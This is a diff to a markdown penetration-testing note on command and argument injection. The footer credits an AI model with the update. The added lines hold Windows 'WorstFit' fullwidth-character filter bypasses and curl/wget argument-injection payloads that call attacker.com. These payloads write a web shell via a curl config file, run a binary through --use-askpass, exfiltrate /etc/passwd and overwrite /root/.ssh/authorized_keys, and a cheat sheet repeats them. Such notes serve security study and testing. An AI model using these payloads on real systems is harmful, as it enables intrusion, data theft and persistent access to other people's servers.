@@ -1,6 +1,6 @@
 # Command Injection
 
-#CommandInjection #WebAttacks #RCE #Evasion #Fuzzing
+#CommandInjection #ArgumentInjection #WebAttacks #RCE #Evasion #Fuzzing #commix #Bashfuscator #InvokeDOSfuscation #BurpSuite #ffuf
 
 ## What is this?
 
@@ -19,11 +19,12 @@ User-controlled input is passed unsanitized to a system shell call. The injected
 
 | Tool | Purpose |
 |---|---|
-| `commix` | Automated command injection detection and exploitation |
-| `Bashfuscator` | Linux bash obfuscation framework |
-| `Invoke-DOSfuscation` | Windows CMD obfuscation generator |
-| `Burp Suite` | Intercept and fuzz injection points |
-| `ffuf` | Fuzz operators and payloads |
+| [[Tools/Web/Commix\|commix]] | Automated command injection detection and exploitation |
+| [[Tools/Payloads & Shells/Bashfuscator\|Bashfuscator]] | Linux bash obfuscation framework |
+| [[Tools/Payloads & Shells/Invoke-DOSfuscation\|Invoke-DOSfuscation]] | Windows CMD obfuscation generator |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept and fuzz injection points |
+| [[Tools/Scanning/ffuf\|ffuf]] | Fuzz operators and payloads |
+| [GTFOArgs](https://gtfoargs.github.io/) | Reference list of binaries exploitable via argument injection |
 
 ---
 
@@ -188,6 +189,32 @@ Shell glob expansion resolves wildcards before execution — avoids typing comma
 
 # Useful if filter blocks the word "cmd" but not environment variable expansion
 ```
+
+### Best-Fit / "WorstFit" (Windows Unicode → ANSI)
+
+When a Windows app takes a Unicode string but calls the ANSI (`*A`) Win32 API, unmappable characters get silently substituted with a "visually similar" ASCII one via Best-Fit mapping. A filter that validates the *Unicode* input never sees the dangerous character — it appears only after conversion, downstream. Named **WorstFit** (Orange Tsai / Splitline Huang, Black Hat EU 2024); affected PHP-CGI, ElFinder, Cuckoo Sandbox, and others.
+
+| Send (Unicode) | Codepoint | Becomes (ANSI) |
+|---|---|---|
+| `＂` fullwidth quotation mark | `U+FF02` | `"` |
+| `－` fullwidth hyphen-minus | `U+FF0D` | `-` |
+| `／` fullwidth solidus | `U+FF0F` | `/` |
+| `＼` fullwidth reverse solidus | `U+FF3C` | `\` |
+| `＞` fullwidth greater-than | `U+FF1E` | `>` |
+| `｜` fullwidth vertical line | `U+FF5C` | `\|` |
+| `Ｙ` fullwidth Y | `U+FF39` | `Y` |
+
+```
+# Argument injection where " and - are filtered — send the fullwidth forms instead
+harmless.txt＂ －－use-askpass=calc ＂
+
+# Quote-break out of an escaped argument that passed validation as Unicode
+＂ ＆ whoami ＆ ＂
+```
+
+> [!warning] Only fires on the ANSI code page in use (varies by system locale) — a payload that works on a CP1252 host may not on CP932/CP936. Confirm which code page the target runs before ruling it out.
+
+> [!tip] Also defeats path-traversal filters (`／..／..／` → `/../../`) and "properly implemented" argument escaping, since the escaping runs before the conversion.
 
 ---
 
@@ -492,6 +519,12 @@ http://169.254.169.254/latest/meta-data/ -o /tmp/meta
 
 # Inject -x to use a proxy (exfil data)
 http://target.com/ -x http://attacker.com:8080/
+
+# -K/--config loads a curl config file — every option in it is honoured,
+# including -o/--output, so one injected flag turns into arbitrary file write
+http://attacker.com/ -K /tmp/uploaded.txt
+# where /tmp/uploaded.txt contains:  output = "/var/www/html/shell.php"
+#                                    url = "http://attacker.com/shell.php"
 ```
 
 ### wget argument injection
@@ -502,7 +535,16 @@ http://attacker.com/shell.php -O /var/www/html/shell.php
 
 # --post-file to exfil a local file
 http://attacker.com/ --post-file=/etc/passwd
+
+# --use-askpass= runs the given binary — straight to RCE, no operators needed
+http://attacker.com/ --use-askpass=/tmp/payload.sh
+# pair with -O to stage the payload first if you get two fetches
+
+# -O to an authorized_keys / cron path when running privileged
+http://attacker.com/key.pub -O /root/.ssh/authorized_keys
 ```
+
+> [!tip] [GTFOArgs](https://gtfoargs.github.io/) is the argument-injection equivalent of GTFOBins — look the binary up there before hand-rolling a gadget.
 
 ### ImageMagick / convert argument injection
 
@@ -576,7 +618,10 @@ $()
 | `whoami` alternatives | `id` `id -un` `echo $USER` |
 | Caret bypass (Windows CMD) | `who^ami` |
 | Base64 exec (Windows PS) | `powershell -EncodedCommand <b64>` |
+| Best-Fit bypass (Windows) | `＂` (U+FF02) → `"`, `－` (U+FF0D) → `-` |
 | Argument injection | `curl <input> --output /webroot/shell.php` |
+| Argument injection → RCE | `wget <input> --use-askpass=/tmp/payload.sh` |
+| Argument injection → file write | `curl <input> -K /tmp/attacker.conf` |
 | Automate | `commix --url "..." --os-cmd="id"` |
 | Linux obfuscate | `bashfuscator -c 'cmd'` |
 | Windows obfuscate | `Invoke-DOSfuscation` |
@@ -584,5 +629,5 @@ $()
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-30*
+*Model: claude-opus-5*
